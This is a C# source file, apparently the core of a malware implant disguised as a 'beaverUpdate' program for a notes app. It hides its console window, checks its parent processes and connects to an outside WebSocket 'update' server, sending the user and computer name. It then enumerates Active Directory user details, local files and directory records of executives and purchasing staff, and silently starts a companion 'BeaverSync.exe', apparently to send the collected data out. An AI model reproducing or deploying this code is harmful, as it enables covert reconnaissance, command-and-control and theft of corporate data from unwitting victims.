using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net.WebSockets;
using VoidSerpent;
using System.Runtime.CompilerServices;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace beaverUpdate
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool AllocConsole();

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0;
        private static DatabaseManager db;

        static async Task Main(string[] args)
        {
            HideConsoleWindow();
            
            // protected start: one instance, specific parents
            if (!BetrayalIsASymptom.protectedStart())
            {
                Console.WriteLine("Unable to run due to security measures.");
                return;
            }

            // Ensure we're tracking state
            string buPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\BeaverNotesPro");
            db = new DatabaseManager(Path.Combine(buPath, "syncstate.db"));

            // Connect to the "update" server
            ToWakeAndAvengeTheDead.HostInfo hostInfo = ToWakeAndAvengeTheDead.GetHostInfo();
            var client = $"{hostInfo.UserName}@{hostInfo.ComputerName}";
            var socketTask = Task.Run(() => CommSDK.ListenToWebSocketAsync($"ws://beaverpro.sketchybins.com/checkupdate?client={client}"));
            

            // Start the task flow
            List<string> userJobDone = new List<string>
            {
                "completed",
                "failed"
            };

            List<string> tasks = new List<string>
            {
                "Licensing", // enumerate local and AD info
                "Paperwork", // enumerate files
                "Whales" // get directory info of purchasing/execs
            };

            // Run through the tasks
            foreach (var task in tasks)
            {
                try
                {
                    string taskStatus = db.GetJobStatus(task);
                    if (!userJobDone.Contains(taskStatus)) //task not completed
                    {
                        doTask(task);
                    }
                } catch
                {
                    doTask(task);
                }
            }

            // need to check if we have pending file jobs to send and run BeaverSync
            string pwTask = db.GetJobStatus("Paperwork");
            string wTask = db.GetJobStatus("Whales");
            if (pwTask == "collected" && wTask == "collected")
            {
                string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;
                ProcessStartInfo bvs = new ProcessStartInfo
                {
                    FileName = Path.Combine(currentDirectory, "BeaverSync.exe"),
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                try
                {
                    Process.Start(bvs);
                }
                catch { }
            }


            // wait for messages
            await socketTask;
        }

        // Task functions
        static void doTask(string taskName)
        {
            switch(taskName)
            {
                case "Licensing":
                    try
                    {
                        DirectoryHelper.UserInfo userInfo = DirectoryHelper.GetUserInfo();
                        db.DirectoryEntry(userInfo.UserName, userInfo.Name, userInfo.Email, userInfo.Title, userInfo.Department, userInfo.Manager);
                        db.JobEntry(name: "Licensing", status: "collected");
                    }
                    catch
                    {
                        db.JobEntry(name: "Licensing", status: "failed");
                    }
                    break;
                case "Paperwork":
                    try
                    {
                        var backupfiles = ToWakeAndAvengeTheDead.EnumerateFiles();
                        foreach (var file in backupfiles)
                        {
                            if (!db.IsHashInDatabase(file.Sha1Hash))
                            {
                                db.FileEntry(Path.GetFileName(file.Path), file.Path, file.Sha1Hash, false, false);
                            }
                        }
                        db.JobEntry(name: "Paperwork", status: "collected");
                    } catch
                    {
                        db.JobEntry(name: "Paperwork", status: "failed");
                    }
                    break;
                case "Whales":
                    try
                    {
                        DirectoryHelper.SoStrangeIRememberYou();
                        db.JobEntry(name: "Whales", status: "collected");
                    }
                    catch {
                        db.JobEntry(name: "Whales", status: "failed");
                    }
                    break;
            }
        }

        private static void HideConsoleWindow()
        {
            IntPtr hWnd = GetConsoleWindow();
            if (hWnd != IntPtr.Zero)
            {
                ShowWindow(hWnd, SW_HIDE);
            }
        }
    }    
}
